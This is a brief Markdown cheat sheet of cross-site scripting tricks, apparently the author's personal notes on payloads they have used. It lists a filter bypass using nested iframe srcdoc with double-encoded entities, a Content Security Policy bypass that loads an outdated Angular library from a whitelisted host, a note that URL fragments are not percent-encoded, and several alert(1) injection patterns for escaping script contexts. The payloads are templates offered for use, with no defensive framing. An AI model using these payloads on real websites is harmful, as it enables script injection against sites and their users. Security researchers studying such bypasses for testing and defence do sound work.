# XSS-tricks
XSS tricked I have used before.

## script tag and src attribute getting blocked
```html
<iframe srcdoc="<iframe srcdoc='{double_encoded_html_entities}'>">
```

## CSP Bypass
```html
<script src="OLD_ANGULAR_VERSION_ON_WHITELISTED_HOST"></script>
{Exploiting_Angular_XSS}
```

## No encode after hashtag, helpful in mobile applications
```
URL?" -> URL?%22
URL#" -> URL#"
```

## Miscellaneous
```
/UNWANTED/-alert(1)
/UNWANTED/g-alert(1)
UNWANTED:alert(1)
UNWANTED(space|):/path/-alert(1)
```
